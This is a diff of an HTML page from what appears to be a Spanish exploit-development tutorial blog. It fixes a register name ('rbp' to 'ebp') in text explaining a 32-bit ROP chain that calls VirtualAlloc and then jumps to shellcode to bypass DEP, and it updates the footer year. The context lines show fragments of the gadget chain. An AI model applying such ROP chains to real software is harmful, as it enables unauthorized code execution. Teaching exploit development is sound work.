@@ -557,7 +557,7 @@ rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi"
 rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x0041e008</span><span class="p">)</span><span class="c1"> # VirtualAlloc()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Nos quedan 3 registros antes de <code class="language-plaintext highlighter-rouge">Temp</code>, en <code class="language-plaintext highlighter-rouge">edi</code> que sera el primero en ejecutarse simplemente ejecutaremos un <code class="language-plaintext highlighter-rouge">ret</code> y pasaremos al valor de <code class="language-plaintext highlighter-rouge">esi</code> que ejecutará <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, al terminar la función ejecutará el <code class="language-plaintext highlighter-rouge">pop rbp</code> que limpiara el stack para ejecutar la siguiente instrucción que será el salto al shellcode a ejecutar.</p>
+<p class="plain-text">Nos quedan 3 registros antes de <code class="language-plaintext highlighter-rouge">Temp</code>, en <code class="language-plaintext highlighter-rouge">edi</code> que sera el primero en ejecutarse simplemente ejecutaremos un <code class="language-plaintext highlighter-rouge">ret</code> y pasaremos al valor de <code class="language-plaintext highlighter-rouge">esi</code> que ejecutará <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, al terminar la función ejecutará el <code class="language-plaintext highlighter-rouge">pop ebp</code> que limpiara el stack para ejecutar la siguiente instrucción que será el salto al shellcode a ejecutar.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x00401008</span><span class="p">)</span><span class="c1"> # pop ebp; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x00401008</span><span class="p">)</span><span class="c1"> # pop ebp; ret;</span><span class="p">
@@ -724,7 +724,7 @@ C:\Users\user\Desktop></span>
 </article>
   </div>
   <footer class="footer">
-    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+    <span class="footer__copyright">&copy; 2026 - xchg2pwn</span>
   </footer><br><br>
 
 <script type="text/javascript" src="/js/jquery.min.js"></script>
